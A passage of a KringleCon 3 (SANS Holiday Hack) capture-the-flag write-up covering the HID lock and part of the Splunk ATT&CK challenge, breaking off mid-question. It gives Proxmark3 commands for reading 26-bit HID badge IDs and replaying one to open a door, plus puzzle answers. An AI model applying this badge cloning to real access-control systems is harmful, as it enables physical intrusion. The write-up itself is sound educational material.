    <img data-src="/images/kringlecon3/objectives/obj4_06.webp" alt="KringleCon Talks (2nd) floor" data-caption="KringleCon Talks (2nd) floor" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      KringleCon Talks (2nd) floor
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Bow Ninecandle:</strong><br />
You know what <strong>Santa</strong> just told me? He said he thought of yet another marketing pitch for the <em>North Pole</em>.<br />
He wants to call it, &ldquo;The Frostiest Place on Earth!&rdquo;. What&rsquo;s with that?</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jack Frost:</strong><br />
Gosh, there&rsquo;s some really great talks. I&rsquo;m getting all kinds of ideas for different modes of attack.</div>
<h3 id="5---open-hidlock">5 - Open HID Lock</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_01.webp" alt="Objective 5 description" data-caption="Objective 5 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 5 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The HID lock is located in the <em>Workshop</em> on floor 1.5 and in order to access the <em>Workshop</em>, we need to find the <em>Red Bulb</em> and the missing elevator button. After achieving the <a href="#4---speaker-unprep">Speaker UNPrep</a> challenge, we get access to the <em>Speaker UNpreparedness Room</em> where we find the button on the floor. The <em>Red Bulb</em> is found in the <em>Talks Lobby</em> on the floor as well.</p>
<p>We can now head to the <em>Workshop</em> floor. But we need first to activate the green and red power in the <em>Santavator</em> panel. Here is a way to do it:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_05.webp" alt="Workshop access" data-caption="Workshop access" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Workshop access
      
        
        
      
    </figcaption>
  
</figure>
<p>We unlock the second narrative when we reach the 1.5 floor:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative02.webp" alt="narrative 2 of 7" data-caption="narrative 2 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      narrative 2 of 7
      
        
        
      
    </figcaption>
  
</figure>
<p>We find the <em>Proxmark3</em> device that <strong>Bushy</strong> was mentioning on the floor of the <em>Wrapping Room</em>. This should help in opening the door protected by an <em>HID</em> lock:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_06.webp" alt="HID lock" data-caption="HID lock" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      HID lock
      
        
        
      
    </figcaption>
  
</figure>
<p>Now, we need to find someone who wears a badge so that we can try to clone the signal. Let&rsquo;s go by all the elves, open the <em>Proxmark3</em> terminal (from the <em>Items</em> menu), run the command <code>lf hid read</code> or <code>auto</code> and see who is wearing a badge. The following elves respond:</p>
<div class="box">[Noel Boetie - Wrapping Room]<br />
#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020<br />
[Bow Ninecandle - Talks Lobby]<br />
#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023<br />
[Spark Redberry - Castle Entry]<br />
#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022<br />
[Angel Candysalt - Great Room]<br />
#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040<br />
[Holy Evergreen - Kitchen]<br />
#db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024<br />
[Shiny Upatree]<br />
#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025</div>
<p>With this information, we get back to the <em>HID</em> lock. To impersonate a card, we can run the command <code>lf hid sim -r &lt;TAG_ID&gt;</code>. We try the <code>TAG ID</code>s one by one and open the door with <strong>Bow Ninecandle</strong>&rsquo;s one:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_07.webp" alt="badge impersonation" data-caption="badge impersonation" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      badge impersonation
      
        
        
      
    </figcaption>
  
</figure>
<p>We access a dark room and unlock the rest of the <em>Objectives</em>. We need to find the right path to navigate it and reach the light:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_09.webp" alt="area ???" data-caption="area ???" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      area ???
      
        
        
      
    </figcaption>
  
</figure>
<p>When we enter the light, we unlock the 3rd narrative:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative03.webp" alt="Narrative 3 of 7" data-caption="Narrative 3 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Narrative 3 of 7
      
        
        
      
    </figcaption>
  
</figure>
<p>We magically take the control of <strong>Santa</strong> through the painting offered to him and can now see the world through his eyes!</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_10.webp" alt="the new us!" data-caption="the new us!" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      the new us!
      
        
        
      
    </figcaption>
  
</figure>
<p>Seems like we are wearing a different badge now:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_11.webp" alt="black badge" data-caption="black badge" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      black badge
      
        
        
      
    </figcaption>
  
</figure>
<p>It gives us access to a new feature. We can now teleport instantly in any room of the castle:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_12.webp" alt="teleport feature" data-caption="teleport feature" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      teleport feature
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s talk to some of our dear elves who are all still suspicious about <strong>Santa</strong>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Sparkle Redberry:</strong><br />
<strong>Santa</strong>, I just saw you get in the <em>Santavator</em>, but you never came back down, but now you&rsquo;re back. How did you do that?</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Piney Sappington:</strong><br />
Hey Santa! Are you alright? You look a little out of it. Perhaps you could use some rest. You&rsquo;ve been so busy.</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Ginger Breddie:</strong><br />
Hey <strong>Santa</strong>! Did you just come here from floor one and a half?</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Bubble Lightington:</strong><br />
Hey <strong>Santa</strong>… I&rsquo;ve noticed that lately, you&rsquo;ve been telling everyone to &ldquo;Stay frosty.&rdquo; What&rsquo;s that all about?</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Fitzy Shortstack:</strong><br />
&ldquo;Watch <strong>Santa</strong> walk around,&rdquo; they said. &ldquo;See how strange he&rsquo;s behaving,&rdquo; they said. And you know what? They were right. Oh, <strong>Santa</strong>! I didn&rsquo;t see you there! I hope you&rsquo;re feeling OK.</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jewel Loggins:</strong><br />
Hey <strong>Santa</strong>, didn&rsquo;t I just see you walking past me?</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jingle Ringford:</strong><br />
<strong>Santa</strong>, it&rsquo;s surprising to see you all the way down here! I&rsquo;m used to you being up at the <em>North Pole</em>.</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Bow Ninecandle:</strong><br />
<strong>Santa</strong>, it&rsquo;s good to see you. Are you still trying to get the <em>North Pole</em> marketing department to use your new tagline, &ldquo;The North Pole: The Frostiest Place on Earth?&rdquo;</div>
<p><strong>Jack Frost</strong> still sounds suspicious:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jack Frost (Courtyard):</strong><br />
Oh, hi Santa. I&rsquo;m just wandering around, minding my own business. Nothing nefarious going on here.</div>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jack Frost (Talk Lobby):</strong><br />
Hello <strong>Santa</strong>. It&rsquo;s you again. Thank you so much for hosting this event. I know we&rsquo;ve had our issues in the past, but I think we should just bury the hatchet.</div>
<p>Let&rsquo;s go back to our own self by taking the hidden exit under the painting in the <em>Castle Entry</em>. Maybe we will need this power again later…</p>
<h3 id="6---splunk-challenge">6 - Splunk Challenge</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_01.webp" alt="Objective 6 description" data-caption="Objective 6 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 6 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The <em>Splunk</em> terminal is located in the <em>Great Room</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_02.webp" alt="Objective 6 location" data-caption="Objective 6 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 6 location
      
        
        
      
    </figcaption>
  
</figure>
<p>The elf tells us:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Angel Candysalt:</strong><br />
You know, every day or so, I see <strong>Santa</strong> looking at his portrait in the entry and then letting out a maniacal &ldquo;Bwahahaha.&rdquo;<br />
It&rsquo;s kind of disturbing and I&rsquo;m worried about him.</p>
<p>Oh, this machine here? Oh, it&rsquo;s nothing you&rsquo;ll be able to use. You know, we have pretty tight controls on authentication for that infrastructure. There&rsquo;s some biometrics, so only <strong>Santa</strong> and a handful of elves can log in.</p>
</div>
<p>When we try to access the terminal we get the message:</p>
<div class="box">The <em>Splunk</em> terminal is for <strong>Santa</strong> and select <em>SOC</em> elves only.</div>
<p>This is where <strong>Santa</strong>&rsquo;s impersonation comes in. Let&rsquo;s come back as <strong>Santa</strong>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Angel Candysalt:</strong><br />
Hey <strong>Santa</strong>, there&rsquo;s some crazy stuff going on that we can see through our <em>Splunk</em> infrastructure. You better login and see what&rsquo;s up.</div>
<p>Like in last year&rsquo;s edition, we access an instance of <em>Splunk Enterprise</em> where we have to answer some training questions that will lead us to finally answer the <em>Objective</em> question: &ldquo;What is the name of the adversary group that <strong>Santa</strong> feared would attack <em>KringleCon</em>?&rdquo;. We get as well some help from <strong>Santa</strong>&rsquo;s <em>SOC</em> team through a chat:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_03.webp" alt="KringleCastle SOC interface" data-caption="KringleCastle SOC interface" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      KringleCastle SOC interface
      
        
        
      
    </figcaption>
  
</figure>
<p>This year&rsquo;s dataset will include simulated attacks based on the <a href="https://attack.mitre.org/matrices/enterprise/">MITRE® ATT&amp;CK Matrix for Enterprise</a>. The simulation is done with <a href="https://github.com/splunk/attack_range">Splunk Attack Range</a>. Let&rsquo;s answer the questions.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. How many distinct MITRE ATT&amp;CK techniques did <strong>Alice</strong> emulate?</div>
<p><strong>Alice Bluebird</strong> gives us some directions to start:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_04.webp" alt="Question 1 hint" data-caption="Question 1 hint" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Question 1 hint
      
        
        
      
    </figcaption>
  
</figure>
<p>We can copy/paste <strong>Alice</strong>&rsquo;s command into the <code>search</code> field to get the following indexes:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_05.webp" alt="Splunk indexes" data-caption="Splunk indexes" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Splunk indexes
      
        
        
      
    </figcaption>
  
</figure>
<p>The index names <code>txxxx</code> correspond to the attack technique name. We can easily count that there are 13 main attack techniques simulated. We can as well output this value with:</p>
<div class="box">| tstats count where index=t* by index<br />
| rex field=index (?<tech>t\d+)<br />
| stats dc(tech)</div>
<p>The <a href="https://docs.splunk.com/Documentation/SCS/current/SearchReference/RexCommandOverview"><code>rex</code></a> command is used to extract a string based on a regex and the <a href="https://docs.splunk.com/Documentation/SCS/current/SearchReference/Aggregatefunctions#distinct_count.28.26lt.3Bvalue.26gt.3B.29_or_dc.28.26lt.3Bvalue.26gt.3B.29"><code>dc</code></a> function counts distinct values.</p>
<p>Let&rsquo;s look up the techniques used:</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Technique</th>
</tr>
</thead>
<tbody>
<tr>
<td>t1033</td>
<td>System Owner / User Discovery</td>
</tr>
<tr>
<td>t1057</td>
<td>Process Discovery</td>
</tr>
<tr>
<td>t1059.003</td>
<td>Command and Scripting Interpreter: Windows Command Shell</td>
</tr>
<tr>
<td>t1059.005</td>
<td>Command and Scripting Interpreter: Visual Basic</td>
</tr>
<tr>
<td>t1071.001</td>
<td>Application Layer Protocol: Web Protocols</td>
</tr>
<tr>
<td>t1082</td>
<td>System Information Discovery</td>
</tr>
<tr>
<td>t1105</td>
<td>Ingress Tool Transfer</td>
</tr>
<tr>
<td>t1106</td>
<td>Native API</td>
</tr>
<tr>
<td>t1123</td>
<td>Audio Capture</td>
</tr>
<tr>
<td>t1204.002</td>
<td>User Execution: Malicious File</td>
</tr>
<tr>
<td>t1547.001</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
</tr>
<tr>
<td>t1548.002</td>
<td>Abuse Elevation Control Mechanism: Bypass User Account Control</td>
</tr>
<tr>
<td>t1559.002</td>
<td>Inter-Process Communication: Dynamic Data Exchange</td>
</tr>
<tr>
<td>t1566.001</td>
<td>Phishing: Spearphishing Attachment</td>
</tr>
</tbody>
</table>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> 13</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. What are the names of the two indexes that contain the results of emulating <em>Enterprise ATT&amp;CK</em> technique <code>1059.003</code>? (Put them in alphabetical order and separate them with a space)</div>
<p>We can see that from the previous screenshot.</p>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> t1059.003-main t1059.003-win</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. One technique that <strong>Santa</strong> had us simulate deals with &lsquo;system information discovery&rsquo;. What is the full name of the registry key that is queried to determine the <code>MachineGuid</code>?</div>
<p><strong>Alice</strong> says:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_06.webp" alt="hint Q3" data-caption="hint Q3" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      hint Q3
      
        
        
      
    </figcaption>
  
</figure>
<p>As we listed above, the <em>System Information Discovery</em> technique has the <em>ID T1082</em>. If we take a look at the <em>Atomic Red Team</em> repo, and go to <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md">the technique description</a>, we can see the atomic tests that are performed and one of them can be used to retrieve the <code>MachineGuid</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_07.webp" alt="T1082 atomic test" data-caption="T1082 atomic test" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      T1082 atomic test
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. According to events recorded by the <em>Splunk Attack Range</em>, when was the first <em>OSTAP</em> related atomic test executed? (Please provide the alphanumeric <em>UTC</em> timestamp.)</div>
<figure >
  
  
  
